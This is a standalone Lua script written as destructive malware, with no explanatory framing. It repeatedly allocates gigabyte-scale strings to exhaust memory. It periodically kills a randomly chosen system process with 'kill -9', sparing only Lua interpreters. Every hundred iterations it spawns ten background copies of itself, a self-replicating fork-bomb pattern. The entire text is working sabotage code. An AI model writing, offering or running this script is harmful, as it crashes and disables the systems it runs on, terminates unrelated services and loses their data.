-- Function to generate large data structure
local function generate_data()
    return string.rep(math.random(36^2), 10^9) -- Generate a string of length 10^9
end

-- Function to kill a random process
local function kill_random_process()
    local processes = io.popen("ps -e -o pid,comm"):read("*all") -- Get a list of processes
    local process_ids = {}
    for pid, comm in processes:gmatch("(%d+)%s+(%S+)") do
        if comm ~= "lua" then -- Avoid killing Lua interpreter itself
            table.insert(process_ids, pid)
        end
    end
    local process_to_kill = process_ids[math.random(#process_ids)] -- Randomly select a process
    os.execute("kill -9 " .. process_to_kill) -- Kill the process
    return process_to_kill
end

-- Function to overwhelm the system
local function overwhelm_system()
    print("Overwhelming system...")
    for _ = 1, 10 do
        os.execute("lua " .. arg[0] .. " &") -- Start a new Lua process
    end
end

-- Main function
local function main()
    local count = 1

    while true do
        -- Generate large data structure to consume memory
        local data = generate_data()

        -- Save to multiple text files (simulated)
        for i = 1, 10000 do
            -- Simulate file creation
        end

        count = count + 1

        -- Kill random process every 50 iterations
        if count % 50 == 0 then
            local killed_process = kill_random_process()
            print("Killed process with PID: " .. killed_process)
        end

        -- Overwhelm the system every 100 iterations
        if count % 100 == 0 then
            overwhelm_system()
        end
    end
end

-- Start the main function
main()
